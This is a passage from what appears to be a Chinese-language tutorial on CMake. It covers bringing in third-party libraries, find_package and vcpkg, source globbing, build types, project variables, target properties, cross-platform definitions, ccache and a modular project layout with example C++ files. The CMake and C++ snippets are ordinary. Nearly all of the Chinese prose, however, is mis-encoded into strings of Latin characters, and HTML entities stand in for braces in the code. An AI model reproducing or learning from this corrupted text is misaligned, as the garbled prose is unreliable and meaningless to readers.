åº“å°±æ˜¯å—åˆ°ä»–å¯å‘ï¼ˆå®Œå…¨æ˜¯å¤´æ–‡ä»¶ç»„æˆï¼‰ fmtlib/fmt - æ ¼å¼åŒ–åº“ï¼Œæä¾› std::format çš„æ›¿ä»£å“ï¼ˆéœ€è¦ -DFMT_HEADER_ONLYï¼‰ gabime/spdlog - èƒ½é€‚é…æ§åˆ¶å°ï¼Œå®‰å“ç­‰å¤šåç«¯çš„æ—¥å¿—åº“ï¼ˆå’Œ fmt å†²çªï¼ï¼‰ åªéœ€è¦æŠŠä»–ä»¬çš„ include ç›®å½•æˆ–å¤´æ–‡ä»¶ä¸‹è½½ä¸‹æ¥ï¼Œç„¶å include_directories(spdlog/include) å³å¯ã€‚ ç¼ºç‚¹ï¼šå‡½æ•°ç›´æ¥å®ç°åœ¨å¤´æ–‡ä»¶é‡Œï¼Œæ²¡æœ‰æå‰ç¼–è¯‘ï¼Œä»è€Œéœ€è¦é‡å¤ç¼–è¯‘åŒæ ·å†…å®¹ï¼Œç¼–è¯‘æ—¶é—´é•¿ã€‚ 12345cmake_minimum_required(VERSION 3.12)project(hellocmake LANGUAGES CXX)add_executable(a.out main.cpp)target_include_directories(a.out PUBLIC glm/include) git clone git@github.com:g-truc/glm.git --depth=1 # depth=1 æ›´å¿«ï¼Œä¸æƒ³åšè´¡çŒ®çš„è¯ï¼Œè¿™æ ·å°±å¥½ å­æ¨¡å— ç¬¬äºŒå‹å¥½çš„æ–¹å¼åˆ™æ˜¯ä½œä¸º CMake å­æ¨¡å—å¼•å…¥ï¼Œä¹Ÿå°±æ˜¯é€šè¿‡ add_subdirectoryã€‚ æ–¹æ³•å°±æ˜¯æŠŠé‚£ä¸ªé¡¹ç›®ï¼ˆä»¥fmtä¸ºä¾‹ï¼‰çš„æºç æ”¾åˆ°ä½ å·¥ç¨‹çš„æ ¹ç›®å½•ï¼š è¿™äº›åº“èƒ½å¤Ÿå¾ˆå¥½åœ°æ”¯æŒä½œä¸ºå­æ¨¡å—å¼•å…¥ï¼š fmtlib/fmt - æ ¼å¼åŒ–åº“ï¼Œæä¾› std::format çš„æ›¿ä»£å“ gabime/spdlog - èƒ½é€‚é…æ§åˆ¶å°ï¼Œå®‰å“ç­‰å¤šåç«¯çš„æ—¥å¿—åº“ ericniebler/range-v3 - C++20 ranges åº“å°±æ˜¯å—åˆ°ä»–å¯å‘ g-truc/glm - æ¨¡ä»¿ GLSL è¯­æ³•çš„æ•°å­¦çŸ¢é‡/çŸ©é˜µåº“ abseil/abseil-cpp - æ—¨åœ¨è¡¥å……æ ‡å‡†åº“æ²¡æœ‰çš„å¸¸ç”¨åŠŸèƒ½ bombela/backward-cpp - å®ç°äº† C++ çš„å †æ ˆå›æº¯ä¾¿äºè°ƒè¯• google/googletest - è°·æ­Œå•å…ƒæµ‹è¯•æ¡†æ¶ google/benchmark - è°·æ­Œæ€§èƒ½è¯„ä¼°æ¡†æ¶ glfw/glfw - OpenGL çª—å£å’Œä¸Šä¸‹æ–‡ç®¡ç† libigl/libigl - å„ç§å›¾å½¢å­¦ç®—æ³•å¤§åˆé›† 1234567cmake_minimum_required(VERSION 3.12)project(hellocmake LANGUAGES CXX)add_subdirectory(fmt)add_executable(a.out main.cpp)target_link_libraries(a.out PUBLIC fmt) å¼•ç”¨ç³»ç»Ÿä¸­é¢„å®‰è£…çš„ç¬¬ä¸‰æ–¹åº“ é¢„å®‰è£…--å¯ä»¥è§£å†³å­æ¨¡å—æ–¹å¼ä¸­å¯èƒ½ä¼šå‡ºç°çš„è±å½¢ä¾èµ–çš„é—®é¢˜ã€‚ ä½¿ç”¨ apt æˆ–è€… pacman æˆ–è€… yum å®‰è£…ã€‚ å¯ä»¥é€šè¿‡ find_package å‘½ä»¤å¯»æ‰¾ç³»ç»Ÿä¸­çš„åŒ…/åº“ï¼š 1234567cmake_minimum_required(VERSION 3.12)project(hellocmake LANGUAGES CXX)add_executable(a.out main.cpp)find_package(fmt REQUIRED)target_link_libraries(a.out PUBLIC fmt::fmt) ä¸ºä»€ä¹ˆæ˜¯ fmt::fmt è€Œä¸æ˜¯ç®€å•çš„ fmtï¼Ÿ ç°ä»£ CMake è®¤ä¸ºä¸€ä¸ªåŒ… (package) å¯ä»¥æä¾›å¤šä¸ªåº“ï¼Œåˆç§°ç»„ä»¶ (components)ï¼Œæ¯”å¦‚ TBB è¿™ä¸ªåŒ…ï¼Œå°±åŒ…å«äº† tbb, tbbmalloc, tbbmalloc_proxy è¿™ä¸‰ä¸ªç»„ä»¶ã€‚ å› æ­¤ä¸ºé¿å…å†²çªï¼Œæ¯ä¸ªåŒ…éƒ½äº«æœ‰ä¸€ä¸ªç‹¬ç«‹çš„åå­—ç©ºé—´ï¼Œä»¥ :: çš„åˆ†å‰²ï¼ˆå’Œ C++ è¿˜æŒºåƒçš„ï¼‰ã€‚ ä½ å¯ä»¥æŒ‡å®šè¦ç”¨å“ªå‡ ä¸ªç»„ä»¶ï¼š 123find_package(TBB REQUIRED COMPONENTS tbb tbbmalloc REQUIRED)target_link_libraries(myexec PUBLIC TBB::tbb TBB::tbbmalloc) åƒQt5 è¿™ç§é¡¹ç›®ï¼Œfind_packageå°±éœ€è¦æŒ‡å®šå‡ºéœ€è¦çš„ç»„ä»¶çš„åç§°ã€‚ Windows ä¸Šæ‰¾ä¸åˆ° Qt5 åŒ…æ€ä¹ˆåŠï¼Ÿæ‰‹åŠ¨æŒ‡å®š Qt5_DIRã€‚ 123456add_executable(main main.cpp)set(Qt5_DIR C:/Qt/Qt5.14.2/msvc2019_64/lib/cmake)find_package(Qt5 REQUIRED COMPONENTS Widgets Gui REQUIRED)target_link_libraries(main PUBLIC Qt5::Widgets Qt5::Gui) æˆ–è€…åœ¨å‘½ä»¤è¡Œç¼–è¯‘cmakeæ—¶ï¼ŒæŒ‡å®š -DQt5-DIR å‚æ•°ã€‚ Windows åˆ™æ²¡æœ‰è‡ªå¸¦çš„åŒ…ç®¡ç†å™¨ã€‚å› æ­¤å¯ä»¥ç”¨è·¨å¹³å°çš„ vcpkgï¼šhttps://github.com/microsoft/vcpkg ä½¿ç”¨æ–¹æ³•ï¼šä¸‹è½½ vcpkg çš„æºç ï¼Œæ”¾åˆ°ä½ çš„é¡¹ç›®æ ¹ç›®å½•ï¼Œåƒè¿™æ ·ï¼š 12345678910111213&gt; cd vcpkg&gt; .\\bootstrap-vcpkg.bat&gt; .\\vcpkg integrate install&gt; .\\vcpkg install fmt:x64-windows&gt; cd ..&gt; cmake -Bbuild -DCMAKE_TOOLCHAIN_FILE=\"%CD%/vcpkg/scripts/buildsystems/vcpkg.cmake\" å¤šæºæ–‡ä»¶ GLOB_RECURSE èƒ½è‡ªåŠ¨åŒ…å«æ‰€æœ‰å­æ–‡ä»¶å¤¹ä¸‹çš„æ–‡ä»¶ï¼Œæ³¨æ„å…ˆå°†æ‰€æœ‰æºä»£ç æ–‡ä»¶ç»Ÿä¸€ç»„ç»‡åˆ° src æ–‡ä»¶å¤¹ä¸‹ï¼Œå°†buildç›®å½•ä¸srcç›®å½•åˆ†å¼€ã€‚ 123add_executable(main)file(GLOB_RECURSE sources CONFIGURE_DEPENDS *.cpp *.h)target_sources(main PUBLIC $&#123;sources&#125;) CONFIGURE_DEPENDSï¼šè‡ªåŠ¨æ›´æ–°æ–°åŠ çš„æ–‡ä»¶ã€‚ 1234add_executable(main)aux_source_directory(. sources)aux_source_directory(mylib sources)target_sources(main PUBLIC $&#123;sources&#125;) ç”¨ aux_source_directoryï¼Œå¯ä»¥è‡ªåŠ¨æœé›†éœ€è¦çš„æ–‡ä»¶åç¼€åã€‚ CMake å‚æ•°é€‰é¡¹ æ„å»ºçš„ç±»å‹ Debug: -O0 -g Release: -O3 -DNDEBUG MinSizeRel: -Os -DNDEBUG RelWithDebInfo: -O2 -g -DNDEBUG åˆå§‹åŒ–é¡¹ç›®ä¿¡æ¯ 1234567891011cmake_minimum_required(VERSION 3.15)project(hellocmake)message(\"PROJECT_NAME: $&#123;PROJECT_NAME&#125;\")message(\"PROJECT_SOURCE_DIR: $&#123;PROJECT_SOURCE_DIR&#125;\")message(\"PROJECT_BINARY_DIR: $&#123;PROJECT_BINARY_DIR&#125;\")message(\"CMAKE_CURRENT_SOURCE_DIR: $&#123;CMAKE_CURRENT_SOURCE_DIR&#125;\")message(\"CMAKE_CURRENT_BINARY_DIR: $&#123;CMAKE_CURRENT_BINARY_DIR&#125;\")add_executable(main main.cpp)add_subdirectory(mylib) PROJECT_SOURCE_DIRï¼šå½“å‰é¡¹ç›®æºç è·¯å¾„ï¼ˆå­˜æ”¾main.cppçš„åœ°æ–¹ï¼‰ PROJECT_BINARY_DIRï¼šå½“å‰é¡¹ç›®è¾“å‡ºè·¯å¾„ï¼ˆå­˜æ”¾main.exeçš„åœ°æ–¹ï¼‰ CMAKE_SOURCE_DIRï¼šæ ¹é¡¹ç›®æºç è·¯å¾„ï¼ˆå­˜æ”¾main.cppçš„åœ°æ–¹ï¼‰ CMAKE_BINARY_DIRï¼šæ ¹é¡¹ç›®è¾“å‡ºè·¯å¾„ï¼ˆå­˜æ”¾main.exeçš„åœ°æ–¹ï¼‰ PROJECT_IS_TOP_LEVELï¼šBOOLç±»å‹ï¼Œè¡¨ç¤ºå½“å‰é¡¹ç›®æ˜¯å¦æ˜¯ï¼ˆæœ€é¡¶å±‚çš„ï¼‰æ ¹é¡¹ç›® PROJECT_NAMEï¼šå½“å‰é¡¹ç›®å CMAKE_PROJECT_NAMEï¼šæ ¹é¡¹ç›®çš„é¡¹ç›®å åˆ©ç”¨ PROJECT_SOURCE_DIR å¯ä»¥å®ç°ä»å­æ¨¡å—é‡Œç›´æ¥è·å¾—é¡¹ç›®æœ€å¤–å±‚ç›®å½•çš„è·¯å¾„ã€‚ ä¸å»ºè®®ç”¨ CMAKE_SOURCE_DIRï¼Œé‚£æ ·ä¼šè®©ä½ çš„é¡¹ç›®æ— æ³•è¢«äººä½œä¸ºå­æ¨¡å—ä½¿ç”¨ã€‚ LANGUAGES å­—æ®µæ”¯æŒçš„è¯­è¨€åŒ…æ‹¬ï¼š Cï¼šCè¯­è¨€ CXXï¼šC++è¯­è¨€ ASMï¼šæ±‡ç¼–è¯­è¨€ Fortranï¼šè€å¹´äººçš„ç¼–ç¨‹è¯­è¨€ CUDAï¼šè‹±ä¼Ÿè¾¾çš„ CUDAï¼ˆ3.8 ç‰ˆæœ¬æ–°å¢ï¼‰ OBJCï¼šè‹¹æœçš„ Objective-Cï¼ˆ3.16 ç‰ˆæœ¬æ–°å¢ï¼‰ OBJCXXï¼šè‹¹æœçš„ Objective-C++ï¼ˆ3.16 ç‰ˆæœ¬æ–°å¢ï¼‰ ISPCï¼šä¸€ç§å› ç‰¹å°”çš„è‡ªåŠ¨ SIMD ç¼–ç¨‹è¯­è¨€ï¼ˆ3.18 ç‰ˆæœ¬æ–°å¢ï¼‰ å¦‚æœä¸æŒ‡å®š LANGUAGESï¼Œé»˜è®¤ä¸º C å’Œ CXXã€‚ ä½¿ç”¨CMAKE_CXX_STANDARD å˜é‡ï¼Œè€Œä¸æ˜¯ä½¿ç”¨ options æŒ‡å®š -std=c++17ã€‚è¿™æ ·è·¨å¹³å°æ–¹ä¾¿ã€‚ è‹¥è®¾ç½®äº†é¡¹ç›®åï¼Œä¼šè‡ªåŠ¨è®¾ç½®å¦å¤– _SOURCE_DIR ç­‰å˜é‡ã€‚ å¯¹è±¡çš„å±æ€§ 1234567891011add_executable(main main.cpp)set_target_properties(main PROPERTIES CXX_STANDARD 17 # é‡‡ç”¨ C++17 æ ‡å‡†è¿›è¡Œç¼–è¯‘ï¼ˆé»˜è®¤ 11ï¼‰ CXX_STANDARD_REQUIRED ON # å¦‚æœç¼–è¯‘å™¨ä¸æ”¯æŒ C++17ï¼Œåˆ™ç›´æ¥æŠ¥é”™ï¼ˆé»˜è®¤ OFFï¼‰ WIN32_EXECUTABLE ON # åœ¨ Windows ç³»ç»Ÿä¸­ï¼Œè¿è¡Œæ—¶ä¸å¯åŠ¨æ§åˆ¶å°çª—å£ï¼Œåªæœ‰ GUI ç•Œé¢ï¼ˆé»˜è®¤ OFFï¼‰ LINK_WHAT_YOU_USE ON # å‘Šè¯‰ç¼–è¯‘å™¨ä¸è¦è‡ªåŠ¨å‰”é™¤æ²¡æœ‰å¼•ç”¨ç¬¦å·çš„é“¾æ¥åº“ï¼ˆé»˜è®¤ OFFï¼‰ LIBRARY_OUTPUT_DIRECTORY $&#123;CMAKE_SOURCE_DIR&#125;/lib # è®¾ç½®åŠ¨æ€é“¾æ¥åº“çš„è¾“å‡ºè·¯å¾„ï¼ˆé»˜è®¤ $&#123;CMAKE_BINARY_DIR&#125;ï¼‰ ARCHIVE_OUTPUT_DIRECTORY $&#123;CMAKE_SOURCE_DIR&#125;/lib # è®¾ç½®é™æ€é“¾æ¥åº“çš„è¾“å‡ºè·¯å¾„ï¼ˆé»˜è®¤ $&#123;CMAKE_BINARY_DIR&#125;ï¼‰ RUNTIME_OUTPUT_DIRECTORY $&#123;CMAKE_SOURCE_DIR&#125;/bin # è®¾ç½®å¯æ‰§è¡Œæ–‡ä»¶çš„è¾“å‡ºè·¯å¾„ï¼ˆé»˜è®¤ $&#123;CMAKE_BINARY_DIR&#125;ï¼‰ ) windows ä¸­ dll çš„æœç´¢è·¯å¾„åœ¨ exe çš„åŒç›®å½•ä¸‹ï¼Œä»¥åŠç¯å¢ƒå˜é‡ä¸­ã€‚è€Œ Linux ä¸­ï¼Œå¯æ‰§è¡Œæ–‡ä»¶ä¼šæœ‰RPATHå±æ€§å­—æ®µï¼Œè‡ªåŠ¨æŒ‡å‘å®ƒé“¾æ¥åˆ°çš„ .so åº“æ–‡ä»¶ã€‚ ç¼–è¯‘æ—¶æ¶ˆæ¯ message æŒ‡ä»¤å¯ä»¥åœ¨ç¼–è¯‘æ—¶è¾“å‡ºå­—ç¬¦ä¸²å†…å®¹ã€‚ message(STATUS â€œ...â€) è¡¨ç¤ºä¿¡æ¯ç±»å‹æ˜¯çŠ¶æ€ä¿¡æ¯ï¼Œæœ‰ -- å‰ç¼€ï¼› message(WARNING â€œ...â€) è¡¨ç¤ºæ˜¯è­¦å‘Šä¿¡æ¯ï¼› message(AUTHOR_WARNING â€œ...â€) è¡¨ç¤ºæ˜¯ä»…ä»…ç»™é¡¹ç›®ä½œè€…çœ‹çš„è­¦å‘Šä¿¡æ¯ï¼› message(FATAL_ERROR â€œ...â€) è¡¨ç¤ºæ˜¯é”™è¯¯ä¿¡æ¯ï¼Œä¼šç»ˆæ­¢ CMake çš„è¿è¡Œï¼› message(SEND_ERROR â€œ...â€) è¡¨ç¤ºæ˜¯é”™è¯¯ä¿¡æ¯ï¼Œä½†ä¹‹åçš„è¯­å¥ä»ç»§ç»­æ‰§è¡Œï¼› CMakeç¼“å­˜ CMake ç¬¬ä¸€ééœ€è¦æ£€æµ‹ç¼–è¯‘å™¨å’Œ C++ ç‰¹æ€§ç­‰æ¯”è¾ƒè€—æ—¶ï¼Œæ£€æµ‹å®Œä¼šæŠŠç»“æœå­˜å‚¨åˆ°ç¼“å­˜ä¸­ï¼Œè¿™æ ·ç¬¬äºŒéè¿è¡Œ cmake -B build æ—¶å°±å¯ä»¥ç›´æ¥ç”¨ç¼“å­˜çš„å€¼ã€‚ æœ‰æ—¶å€™å¤–éƒ¨çš„æƒ…å†µæœ‰æ‰€æ›´æ–°ï¼Œè¿™æ—¶å€™ CMake é‡Œç¼“å­˜çš„å´æ˜¯æ—§çš„å€¼ï¼Œä¼šå¯¼è‡´ä¸€ç³»åˆ—é—®é¢˜ã€‚ æœ€ç®€å•çš„åŠæ³•å°±æ˜¯åˆ é™¤ build æ–‡ä»¶å¤¹ã€‚ è‹¥ä¸æƒ³ä»å¤´é‡æ–°ç¼–è¯‘ï¼Œå¯ä»¥åªåˆ é™¤ build/CMakeCache.txt è¿™ä¸ªæ–‡ä»¶ã€‚ CMakeè·¨å¹³å° æ ¹æ®ä¸åŒæ“ä½œç³»ç»Ÿï¼Œå®šä¹‰å®ï¼š 1234567891011add_executable(main)file(GLOB sources CONFIGURE_DEPENDS *.cpp *.h)target_sources(main PUBLIC $&#123;sources&#125;)if (WIN32) target_compile_definitions(main PUBLIC MY_NAME=\"Bill Gates\")elseif (UNIX AND NOT APPLE) target_compile_definitions(main PUBLIC MY_NAME=\"Linus Torvalds\")elseif (APPLE) target_compile_definitions(main PUBLIC MY_NAME=\"Steve Jobs\")endif() ä½¿ç”¨ç”Ÿæˆå™¨è¡¨è¾¾å¼å¯ä»¥å†™æˆï¼š 123456789add_executable(main)file(GLOB sources CONFIGURE_DEPENDS *.cpp *.h)target_sources(main PUBLIC $&#123;sources&#125;)target_compile_definitions(main PUBLIC $&lt;$&lt;PLATFORM_ID:Windows&gt;:MY_NAME=\"Bill Gates\"&gt; $&lt;$&lt;PLATFORM_ID:Linux&gt;:MY_NAME=\"Linus Torvalds\"&gt; $&lt;$&lt;PLATFORM_ID:Darwin&gt;:MY_NAME=\"Steve Jobs\"&gt; ) CXX_COMPILER_ID å¯ä»¥åˆ¤æ–­ç¼–è¯‘å™¨ç±»å‹ï¼š 12345678add_executable(main)file(GLOB sources CONFIGURE_DEPENDS *.cpp *.h)target_sources(main PUBLIC $&#123;sources&#125;)target_compile_definitions(main PUBLIC $&lt;$&lt;CXX_COMPILER_ID:GNU,Clang&gt;:MY_NAME=\"Open-source\"&gt; $&lt;$&lt;CXX_COMPILER_ID:MSVC,NVIDIA&gt;:MY_NAME=\"Commercial\"&gt; ) å˜é‡ä¸åˆ¤æ–­ çˆ¶æ¨¡å—é‡Œå®šä¹‰çš„å˜é‡ï¼Œä¼šä¼ é€’ç»™å­æ¨¡å—ã€‚ä½†æ˜¯å­æ¨¡å—é‡Œå®šä¹‰çš„å˜é‡ï¼Œä¸ä¼šä¼ é€’ç»™çˆ¶æ¨¡å—ã€‚ å¯ä»¥ä½¿ç”¨ ${xx} è®¿é—®çš„æ˜¯å±€éƒ¨å˜é‡ï¼Œ$ENV{xx} è®¿é—®ç³»ç»Ÿçš„ç¯å¢ƒå˜é‡ï¼Œç”¨ $CACHE{xx} æ¥è®¿é—®ç¼“å­˜é‡Œçš„ xx å˜é‡ã€‚ if (DEFINED ENV{xx}) å¯ä»¥åˆ¤æ–­æŸç¯å¢ƒå˜é‡æ˜¯å¦å­˜åœ¨ã€‚if (xx) å¯ä»¥åˆ¤æ–­æŸå˜é‡æ˜¯å¦å­˜åœ¨ä¸”ä¸ä¸ºç©ºå­—ç¬¦ä¸²ã€‚å› ä¸ºç©ºå­—ç¬¦ä¸²ç­‰ä»·äº FALSEã€‚ CCache ç¼–è¯‘åŠ é€Ÿç¼“å­˜ 123456789cmake_minimum_required(VERSION 3.15)project(hellocmake)find_program(CCACHE_PROGRAM ccache)if (CCACHE_PROGRAM) message(STATUS \"Found CCache: $&#123;CCACHE_PROGRAM&#125;\") set_property(GLOBAL PROPERTY RULE_LAUNCH_COMPILE $&#123;CCACHE_PROGRAM&#125;) set_property(GLOBAL PROPERTY RULE_LAUNCH_LINK $&#123;CCACHE_PROGRAM&#125;)endif() gcc ç¼–è¯‘ä½¿ç”¨æ–¹æ³•ï¼ŒæŠŠ gcc -c main.cpp -o main æ¢æˆ ccache gcc -c main.cpp -o main å³å¯ã€‚ CMake é¡¹ç›®ç®¡ç†æ¨¡å—åŒ–æŒ‡å— ç›®å½•ç»„ç»‡æ ¼å¼ï¼š é¡¹ç›®å/include/é¡¹ç›®å/æ¨¡å—å.h é¡¹ç›®å/src/æ¨¡å—å.cpp CMakeLists.txt ä¸­å†™ï¼š target_include_directories(é¡¹ç›®å PUBLIC include) æºç æ–‡ä»¶ä¸­å†™ï¼š #include &lt;é¡¹ç›®å/æ¨¡å—å.h&gt; é¡¹ç›®å::å‡½æ•°å(); å¤´æ–‡ä»¶ï¼ˆé¡¹ç›®å/include/é¡¹ç›®å/æ¨¡å—å.hï¼‰ä¸­å†™ï¼š 1234#pragma oncenamespace é¡¹ç›®å &#123; void å‡½æ•°å();&#125; å®ç°æ–‡ä»¶ï¼ˆé¡¹ç›®å/src/æ¨¡å—å.cppï¼‰ä¸­å†™ï¼š 1234#include &lt;é¡¹ç›®å/æ¨¡å—å.h&gt;namespace é¡¹ç›®å &#123; void å‡½æ•°å() &#123; å‡½æ•°å®ç° &#125;&#125; ç¤ºä¾‹ ç¤ºä¾‹ç»„ç»‡æ–¹å¼ï¼š 12345678910111213141516171819â”œâ”€â”€ biologyâ”‚ â”œâ”€â”€ CMakeLists.txtâ”‚ â”œâ”€â”€ includeâ”‚ â”‚ â””â”€â”€ biologyâ”‚ â”‚ â”œâ”€â”€ Animal.hâ”‚ â”‚ â””â”€â”€ Carer.hâ”‚ â””â”€â”€ srcâ”‚ â”œâ”€â”€ Animal.cppâ”‚ â””â”€â”€ Carer.cppâ”œâ”€â”€ cmakeâ”‚ â””â”€â”€ MyUsefulFuncs.cmakeâ”œâ”€â”€ CMakeLists.txtâ””â”€â”€ pybmain â”œâ”€â”€ CMakeLists.txt â”œâ”€â”€ include â”‚ â””â”€â”€ pybmain â”‚ â””â”€â”€ myutils.h â””â”€â”€ src â””â”€â”€ main.cpp å¤§å‹çš„é¡¹ç›®ï¼Œå¾€å¾€ä¼šåˆ’åˆ†ä¸ºå‡ ä¸ªå­é¡¹ç›®ã€‚å³åªæœ‰ä¸€ä¸ªå­é¡¹ç›®ï¼Œä¹Ÿå»ºè®®åˆ›å»ºä¸€ä¸ªå­ç›®å½•ï¼Œæ–¹ä¾¿ä»¥åè¿½åŠ æ–°çš„å­é¡¹ç›®ã€‚ ä¸Šé¢çš„ä¾‹å­ä¸­ï¼Œåœ¨æ ¹ç›®å½•ä¸‹ï¼Œåˆ›å»ºäº†ä¸¤ä¸ªå­é¡¹ç›® biology å’Œ pybmainï¼Œä»–ä»¬åˆ†åˆ«åœ¨å„è‡ªçš„ç›®å½•ä¸‹æœ‰è‡ªå·±çš„ CMakeLists.txtã€‚ 12345678910111213141516cmake_minimum_required(VERSION 3.18)if (NOT CMAKE_BUILD_TYPE) set(CMAKE_BUILD_TYPE Release)endif()set(CMAKE_CXX_STANDARD 20)set(CMAKE_CXX_STANDARD_REQUIRED ON)set(CMAKE_CXX_EXTENSIONS OFF)set(CMAKE_MODULE_PATH \"$&#123;CMAKE_CURRENT_LIST_DIR&#125;/cmake;$&#123;CMAKE_MODULE_PATH&#125;\")project(CppCMakeDemo LANGUAGES CXX)include(MyUsefulFuncs)add_subdirectory(pybmain)add_subdirectory(biology) åœ¨æ ¹é¡¹ç›®çš„ CMakeLists.txt ä¸­ï¼Œè®¾ç½®äº†é»˜è®¤çš„æ„å»ºæ¨¡å¼ï¼Œè®¾ç½®äº†ç»Ÿä¸€çš„ C++ ç‰ˆæœ¬ç­‰å„ç§é€‰é¡¹ã€‚ ç„¶åé€šè¿‡ project å‘½ä»¤åˆå§‹åŒ–äº†æ ¹é¡¹ç›®ã€‚éšåé€šè¿‡ add_subdirectory æŠŠä¸¤ä¸ªå­é¡¹ç›® pybmain å’Œ biology æ·»åŠ è¿›æ¥ï¼Œè¿™ä¼šè°ƒç”¨ pybmain/CMakeLists.txt å’Œ biology/CMakeLists.txtã€‚ 123file(GLOB_RECURSE srcs CONFIGURE_DEPENDS src/*.cpp include/*.h)add_library(biology STATIC $&#123;srcs&#125;)target_include_directories(biology PUBLIC include) å­é¡¹ç›®çš„ CMakeLists.txt å°±å¹²å‡€è®¸å¤šï¼Œåªæ˜¯åˆ›å»ºäº† biology è¿™ä¸ªé™æ€åº“å¯¹è±¡ï¼Œå¹¶é€šè¿‡ GLOB_RECRUSE ä¸ºä»–æ‰¹é‡æ·»åŠ äº†æ‰€æœ‰ä½äº src å’Œ include ä¸‹æºç å’Œå¤´æ–‡ä»¶ã€‚ æ ¹é¡¹ç›®çš„ CMakeLists.txt è´Ÿè´£å¤„ç†å…¨å±€æœ‰æ•ˆçš„è®¾å®šã€‚è€Œå­é¡¹ç›®çš„ CMakeLists.txt åˆ™ä»…è€ƒè™‘è¯¥å­é¡¹ç›®è‡ªèº«çš„è®¾å®šï¼Œæ¯”å¦‚ä»–çš„å¤´æ–‡ä»¶ç›®å½•ï¼Œè¦é“¾æ¥çš„åº“ç­‰ç­‰ã€‚ è¿™é‡Œç»™ biology è®¾ç½®äº†å¤´æ–‡ä»¶æœç´¢è·¯å¾„ includeã€‚å› ä¸ºå­é¡¹ç›®çš„ CMakeLists.txt é‡ŒæŒ‡å®šçš„è·¯å¾„éƒ½æ˜¯ç›¸å¯¹è·¯å¾„ï¼Œæ‰€ä»¥è¿™é‡ŒæŒ‡å®š include å®é™…ä¸Šæ˜¯ï¼šæ ¹/biology/includeã€‚ ä½¿ç”¨ PUBLIC ä¿®é¥°ç¬¦ï¼Œè¿™æ˜¯ä¸ºäº†è®©é“¾æ¥ biology çš„ pybmain ä¹Ÿèƒ½å¤Ÿå…±äº« æ ¹/biology/include è¿™ä¸ªå¤´æ–‡ä»¶æœç´¢è·¯å¾„ã€‚ è¿™é‡Œæˆ‘ä»¬ç»™ biology æ‰¹é‡æ·»åŠ äº† src/*.cpp ä¸‹çš„å…¨éƒ¨æºç æ–‡ä»¶ã€‚ æ˜æ˜åªæœ‰ *.cpp éœ€è¦ç¼–è¯‘ï¼Œä¸ºä»€ä¹ˆè¿˜æ·»åŠ äº† include/*.hï¼Ÿä¸ºäº†å¤´æ–‡ä»¶ä¹Ÿèƒ½è¢«çº³å…¥ Vs Code çš„é¡¹ç›®èµ„æºæµè§ˆå™¨ï¼Œæ–¹ä¾¿ç¼–è¾‘ã€‚ å› ä¸ºå­é¡¹ç›®çš„ CMakeLists.txt é‡ŒæŒ‡å®šçš„è·¯å¾„éƒ½æ˜¯ç›¸å¯¹è·¯å¾„ï¼Œæ‰€ä»¥è¿™é‡ŒæŒ‡å®š src å®é™…ä¸Šæ˜¯ï¼šæ ¹/biology/srcã€‚ GLOB_RECURSE ç›¸æ¯” GLOB ï¼ŒGLOB_RECURSE ä¼šå¯¹ *.cpp è¿›è¡ŒåµŒå¥—ç›®å½•çš„æœç´¢åŒ¹é…ã€‚ CONFIGURE_DEPENDS é€‰é¡¹åˆ™æ˜¯ç”¨äºè‡ªåŠ¨æ£€æµ‹ç›®å½•æ›´æ–°ã€‚å¦‚æœä¸æ·»åŠ ï¼Œæ¯æ¬¡æ·»åŠ æ–°æ–‡ä»¶åï¼Œéœ€è¦é‡æ–°è¿è¡Œ cmake -B build æ‰èƒ½æ›´æ–°é¡¹ç›®çš„ç¬¦å·é“¾æ¥ä¹‹ç±»çš„ã€‚å¦‚æœæ·»åŠ äº†ï¼Œè¿è¡Œ cmake --build æ—¶æ£€æµ‹åˆ°ç›®å½•æœ‰æ–°æ–‡ä»¶äº†ï¼ŒCMake ä¼šè‡ªåŠ¨å¸®ä½ é‡æ–°è¿è¡Œ cmake -B build æ›´æ–°ã€‚ å¤´æ–‡ä»¶å’Œæºæ–‡ä»¶ç»„ç»‡ å¤´æ–‡ä»¶å’Œæºæ–‡ä»¶åº”ä¿æŒä¸€ä¸€å¯¹åº”çš„å…³ç³»ã€‚ é€šå¸¸æ¯ä¸ªå¤´æ–‡ä»¶éƒ½æœ‰ä¸€ä¸ªå¯¹åº”çš„æºæ–‡ä»¶ï¼Œä¸¤ä¸ªæ–‡ä»¶åå­—åº”å½“ç›¸åŒï¼Œåªæœ‰åç¼€åä¸ä¸€æ ·ã€‚å¤´æ–‡ä»¶ä¸­åŒ…å«å‡½æ•°å’Œç±»çš„å£°æ˜ï¼Œæºæ–‡ä»¶åˆ™åŒ…å«ä»–ä»¬çš„å®ç°ã€‚ å¦‚æœæ˜¯ä¸€ä¸ªç±»ï¼Œåˆ™æ–‡ä»¶ååº”å’Œç±»åç›¸åŒï¼Œæ–¹ä¾¿æŸ¥æ‰¾ï¼ˆAnimal.cppï¼‰ã€‚ 123456789101112131415161718192021#Animal.h#pragma once#include &lt;ostream&gt;namespace biology &#123;struct Animal &#123; virtual void speak(std::ostream &amp;os) const = 0; virtual ~Animal() = default;&#125;;struct Cat : Animal &#123; virtual void speak(std::ostream &amp;os) const override;&#125;;struct Dog : Animal &#123; virtual void speak(std::ostream &amp;os) const override;&#125;;&#125; 12345678910111213#include &lt;biology/Animal.h&gt;namespace biology &#123;void Cat::speak(std::ostream &amp;os) const &#123; os &lt;&lt; \"Meow~\";&#125;void Dog::speak(std::ostream &amp;os) const &#123; os &lt;&lt; \"Wang!\";&#125;&#125; å¤´æ–‡ä»¶ä¸­å‡½æ•°å®šä¹‰ æœ‰æ—¶ä¼šç›´æ¥æŠŠå®ç°ç›´æ¥å†™åœ¨å¤´æ–‡ä»¶é‡Œï¼Œè¿™æ—¶å¯ä»¥æ²¡æœ‰ä¸ä¹‹å¯¹åº”çš„æºæ–‡ä»¶ï¼Œåªæœ‰ä¸€ä¸ªå¤´æ–‡ä»¶ã€‚ æ³¨æ„ï¼šåœ¨å¤´æ–‡ä»¶é‡Œç›´æ¥å®ç°å‡½æ•°æ—¶ï¼Œè¦åŠ  static æˆ– inline å…³é”®å­—ã€‚ 123456789101112131415161718# pybmain/include/pybmain/myutils.h#pragma once#include &lt;string&gt;#include &lt;cctype&gt;namespace pybmain &#123;static std::string alluppercase(std::string s) &#123; std::string ret; for (char c: s) &#123; ret.push_back(std::toupper(c)); &#125; return ret;&#125;&#125; æ·»åŠ æ–°åŠŸèƒ½ æ·»åŠ ä¸€ä¸ªæ–°åŠŸèƒ½æ¨¡å—æ—¶ï¼ŒåŒæ—¶æ·»åŠ 